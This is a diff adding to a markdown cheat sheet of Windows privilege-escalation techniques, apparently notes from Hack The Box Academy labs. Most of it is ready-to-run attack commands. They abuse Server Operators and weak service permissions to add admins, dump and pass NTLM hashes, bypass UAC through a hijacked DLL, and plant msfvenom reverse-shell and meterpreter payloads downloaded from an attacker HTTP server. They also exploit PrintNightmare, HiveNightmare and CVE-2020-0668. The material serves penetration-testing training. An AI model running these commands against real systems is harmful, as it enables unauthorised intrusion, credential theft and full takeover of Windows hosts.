@@ -302,7 +302,7 @@ Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerN
 ```
 Then use inveigh or responder
 
-# Print Operators
+# Print Operators Group
 Run CMD as Admin
 ### Required tools
 ```
@@ -346,4 +346,255 @@ EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```
 .\ExploitCapcom.exe
 ```
+# Server Operations Group
+### Querying the AppReadiness Service
+```
+sc qc AppReadiness
+```
+### PsService.exe
+```
+PsService.exe security AppReadiness
+```
+This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service.
+### Check for local admins
+```
+net localgroup Administrators
+```
+### Modifying the Service Binary Path
+```
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+### Starting the Service
+```
+sc start AppReadiness
+```
+### Confirming the Local Admin Group Membership
+```
+net localgroup Administrators
+```
+You should see server_adm added to the group this time
+### Crackmap Exec 
+```
+crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!'
+```
+### Secretsdump to retrieve NTLM hashes
+```
+impacket-secretsdump server_adm@10.129.43.42 -just-dc-user administrator
+```
+Crack the Hash or PTH
+### Hashcat
+```
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+```
+### PSexec
+```
+impacket-psexec administrator@10.129.43.42 -hashes :7796ee39fd3a9c3a1844556115ae1a54
+```
+# User Account Control
+### Verify Current User
+```
+whoami /user
+```
+### Confirming Admin Group Membership
+```
+net localgroup administrators
+```
+### Reviewing User Privileges
+```
+net localgroup administrators
+```
+### Confirming UAC is enabled
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+```
+### Check UAC Level
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+### In Powershell check Windows Version
+```
+[environment]::OSVersion.Version
+```
+Verify windows version to release
+
+https://en.wikipedia.org/wiki/Windows_10_version_history
+
+https://egre55.github.io/system-properties-uac-bypass/
+### Path Variable
+```
+cmd /c echo %PATH%
+```
+### Create Payload
+```
+msfvenom-p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+```
+### Start HTTP Server
+```
+sudo python3 -m http.server 8080
+```
+### Download payload
+```
+curl http://10.10.14.214:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+```
+### Start Listener
+```
+nc -lvnp 8443
+```
+### Execute in CMD on host
+```
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+### Run payload in CMD
+```
+rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+```
+Then go back to your listener to verify that you caught the shell
+# Permissive File System ACLs
+### Sharpup
+```
+.\SharpUp.exe audit
+```
+### ICAL to verify what groups/users have permissions
+```
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+### Create payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.214 LPORT=4444 --platform windows -f exe > SecurityService.exe
+```
+### NC Listener
+```
+nc -lvnp 4444
+```
+### execute payload
+```
+sc start SecurityService
+```
+# Weak Service Permissions
+### SharUP
+```
+SharpUp.exe audit
+```
+Checking Permissions with AccessChk (change WindscribeService to what is found)
+```
+accesschk.exe /accepteula -quvcw WindscribeService
+```
+### Review Local Group Admin
+```
+net localgroup administrators
+```
+### Changing the Service Binary Path
+```
+sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+```
+### Stopping the Service
+```
+sc stop WindscribeService
+```
+### Starting the Service
+```
+sc start WindscribeService
+```
+### Verify Permissions
+```
+net localgroup administrators
+```
+log off and log back in to complete the permissions
+## Search for Unquoted Service Paths
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+## Check start up programs
+```
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+```
+### Other refrences 
+https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2
+
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+# Kernal Exploits
+### Checking Permissions on the SAM file
+```
+icacls c:\Windows\System32\config\SAM
+```
+### CVE-2021-36934.exe
+```
+ .\CVE-2021-36934.exe
+ ```
+### Spooler Service 
+```
+ls \\localhost\pipe\spoolss
+```
+![image](https://user-images.githubusercontent.com/128841823/233182366-77276325-9498-47bf-94d0-a7840b9f34bd.png)
+### Adding Local Admin with PrintNightmare Powershell POC
+```
+Set-ExecutionPolicy Bypass -Scope Process
+```
+### Import the script
+```
+Import-Module .\CVE-2021-1675.ps1
+```
+```
+Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
+```
+### Test
+```
+net user hacker
+```
+### Enumerating Missing Patches
+```
+PS C:\htb> systeminfo
+PS C:\htb> wmic qfe list brief
+PS C:\htb> Get-Hotfix
+```
+We can search for each KB (Microsoft Knowledge Base ID number) in the Microsoft Update Catalog to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for KB5000808 shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.
+### Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability,
+
+https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
+## Maintenanceservice.exe
+### Checking Permissions of Binary
+```
+icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+### Payload
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
+```
+### Listener
+```
+nc -lvnp 8443
+```
+### Transfer the payload (create two copys)
+```
+wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
+wget http://10.10.14.214:8080/maintenanceservice.exe -O maintenanceservice2.exe
+```
+### Execute the payload
+```
+C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\tools\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+### Check permissions to the new file
+```
+icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+### Replacing File with Malicious Binary
+```
+copy /Y C:\tools\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+### MSFConsole
+```
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <our_ip>
+set LPORT 8443
+exploit
+```
+### Start the service
+```
+net start MozillaMaintenance 
+```
+ 
+ 
+
+
 
